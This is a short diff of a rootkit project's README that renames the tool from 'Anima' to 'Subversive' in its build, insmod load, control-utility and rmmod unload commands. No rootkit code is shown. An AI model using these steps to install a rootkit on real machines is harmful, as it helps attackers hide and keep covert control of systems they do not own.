@@ -1,4 +1,4 @@
-# Anima rootkit #
+# Subversive rootkit #
 
 ## INSTALL ##
 
@@ -7,7 +7,7 @@
 ```
 cd kernel
 make ARCH=x86
-insmod anima.ko
+insmod subversive.ko
 ```
 
 
@@ -16,13 +16,13 @@ insmod anima.ko
 ```
 cd tools
 make
-./anima_ctl -h
+./subversive_ctl -h
 ```
 
 ## UNINSTALL ##
 
 ```
-rmmod anima
+rmmod subversive
 ```
 
 
